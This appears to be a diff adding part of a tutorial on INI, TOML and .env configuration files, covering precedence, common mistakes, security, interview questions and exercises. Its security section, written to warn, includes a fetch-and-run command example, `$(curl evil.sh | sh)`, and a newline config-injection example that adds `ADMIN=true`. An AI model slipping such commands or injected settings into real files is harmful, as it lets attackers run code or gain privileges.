+- In the normal run, `port` comes from TOML (8080), `workers` from `.env` (2), and `debug` from the code default.
+- In the second run, the real environment variables `SERVER_PORT=80` and `SERVER_DEBUG=true` override everything else, which is how a production platform would configure the same code.
+
+## Real-world example
+
+A developer deploys an invoicing backend (Node.js/Express) to a Linux server with systemd. In development she uses `.env` with `node --env-file=.env`. On the server:
+
+- Secrets go in `/etc/invoice-api/api.env` (owned by root, permissions `600`) and are loaded by the unit file's `EnvironmentFile=/etc/invoice-api/api.env`, the systemd INI format pointing to a `.env`-style file.
+- Non-secret settings (rate limits, log level, feature flags) live in a committed `config.toml`, so changes are reviewed in pull requests.
+- At startup, the app logs its effective config with secrets masked, so when a colleague asks "why is the rate limit 50 instead of 100?", the log shows the value came from an environment variable left over in the systemd file.
+
+Once, a Bash backup script on the same server `source`d the `.env` and failed with "command not found". The value `COMPANY_NAME=Acme Traders` had a space and no quotes. Quoting it fixed both the script and the app.
+
+## Common mistakes
+
+- **Treating INI values as typed:** `if config["debug"]:` is true for `"no"` and `"false"`.
+- **`%` in INI values** with Python's `ConfigParser` (use `%%` or `RawConfigParser`).
+- **Unquoted strings in TOML** (`name = shop` is an error), or quoting numbers by accident (`port = "8080"` is a string).
+- **Declaring the same TOML table twice.**
+- **Spaces around `=` or unquoted spaces in `.env`** values used by Bash.
+- **Expecting `.env` values to be numbers or booleans:** they're always strings.
+- **Committing `.env`**, or putting real secrets in `.env.example`.
+- **Assuming `.env` overrides real environment variables:** usually it doesn't, so a stale exported variable silently wins.
+- **Different loaders, different results** for `$`, quotes and comments.
+
+## Security lens
+
+<Callout type="security">
+Config files often hold the most valuable data on a server. Protect where they live, who can read them, and what goes into them.
+</Callout>
+
+- **Permissions:** secret config files should be readable only by the service user (`chmod 600`, owned by that user or root). `~/.aws/credentials` and `.env` files are prime targets for malware and attackers on a compromised machine.
+- **Never commit** `.env`, `credentials`, or config files with real secrets. Use `.gitignore` plus secret scanning.
+- **Don't serve config files over the web:** misconfigured web servers exposing `/.env` or `/config.ini` are scanned for constantly by bots. Keep them **outside** the web root and block dotfiles in Nginx/Apache.
+- **Config injection:** if user input is written into a config file without validation, a value containing a newline can add new settings. For example, writing `NAME=$input` where the input is `x` + newline + `ADMIN=true` creates an extra `ADMIN=true` line. Validate input and use a proper library to write config.
+- **Interpolation and `source`:** loading a `.env` with Bash `source` **executes** it as shell code, so a malicious value like `$(curl evil.sh | sh)` would run. Only source files you control, or parse them with a proper loader.
+- **Print effective config without secrets**, and keep secrets out of logs, error pages and crash reports.
+
+## Interview questions
+
+<QA q="What is the main difference between INI and TOML?">
+INI is an informal format with sections and key-value pairs but no official specification and no types, so every value is a string and parsers differ in details. TOML has a formal specification with typed values such as strings, integers, floats, booleans, dates, arrays and nested tables, so all compliant parsers read a file the same way.
+</QA>
+
+<QA q="What is a .env file and how should it be used?">
+A .env file contains NAME=value lines that a loader such as python-dotenv, Node's --env-file option or Docker Compose loads into environment variables. It is used for secrets and per-machine settings in local development. It should never be committed to Git; instead a .env.example template with variable names but no real values is committed, and production platforms provide real environment variables.
+</QA>
+
+<QA q="If PORT is set both in .env and as a real environment variable, which one does the app use?">
+With common loaders such as python-dotenv and Node's --env-file, the existing real environment variable wins and the .env value is ignored, unless an override option is used. This lets deployment platforms override development defaults, but it can also cause confusion when a stale exported variable silently takes precedence.
+</QA>
+
+<QA q="What is an array of tables in TOML?">
+An array of tables is declared with double square brackets, such as [[servers]]. Each occurrence adds a new table to an array with that name, and the keys that follow belong to that element until the next header. It corresponds to a JSON array of objects and is used for lists like redirects, binaries or servers.
+</QA>
+
+<QA q="Why is it risky to load a .env file with Bash source?">
+source executes the file as shell code, so values with spaces can be interpreted as commands and malicious content such as command substitutions would run with the script's privileges. It also parses quoting differently from application loaders. Safer options are to use a dedicated parser or only source files you fully control with strictly quoted values.
+</QA>
+
+## Key terms
+
+<Terms>
+  <Term name="INI">Informal config format with [sections] and key = value lines.</Term>
+  <Term name="configparser">Python's built-in INI parser.</Term>
+  <Term name="Interpolation">Referencing other values inside a value, e.g. %(base_dir)s.</Term>
+  <Term name="TOML">Typed, specified config format: Tom's Obvious, Minimal Language.</Term>
+  <Term name="Table">A TOML group of keys, declared with [name].</Term>
+  <Term name="Array of tables">TOML list of tables declared with [[name]].</Term>
+  <Term name="pyproject.toml">Standard Python project configuration file.</Term>
+  <Term name=".env file">NAME=value lines loaded into environment variables.</Term>
+  <Term name="Precedence">Rules deciding which source of a setting wins.</Term>
+  <Term name="Twelve-Factor config">Principle of keeping configuration in the environment, not in code.</Term>
+</Terms>
+
+## Practice
+
+1. Open your own `~/.gitconfig` and identify its sections, keys and any subsections.
+2. Write an INI file with a `[DEFAULT]` section and interpolation, then read it with `getint` and `getboolean`.
+3. Convert the INI file to TOML with proper types and nested tables, and load it with `tomllib`.
+4. Add a `[[jobs]]` array of tables to a TOML file (name, schedule, command) and loop over it in Python.
+5. Create a `.env` file that works identically in python-dotenv, Node `--env-file` and Bash `source` (test all three).
+6. Extend the hands-on loader so a `--port` command-line flag overrides everything else.
+
+Next: **XML**.
